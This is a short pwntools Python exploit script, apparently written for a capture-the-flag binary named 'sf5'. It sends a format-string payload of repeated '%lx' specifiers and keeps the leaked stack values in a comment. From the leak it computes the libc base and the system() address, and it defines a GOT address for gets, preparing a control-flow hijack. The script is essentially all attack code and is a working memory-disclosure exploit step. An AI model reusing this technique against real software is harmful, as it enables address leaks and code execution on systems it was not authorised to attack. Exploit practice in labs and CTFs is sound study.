from pwn import *

p = process("./sf5")

gets_got = 0x601048

p.recvuntil("exit\n")

# buf_start_index --> 6
pay = ""
pay += "A" * 8 + "B" * 8 + "C" * 8
pay += "%lx-" * 20

p.sendline(pay)

# AAAAAAAABBBBBBBBCCCCCCCC7ffd613e5870-100-7faed7043360-7faed751f700-0-4141414141414141-4242424242424242-4343434343434343-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-a-0-

libc_base = int(p.recvline().split(b"-")[2], 16) - 0xf7360
sys = libc_base + 0x453a0

print("libc base = {}".format(hex(libc_base)))

p.interactive()
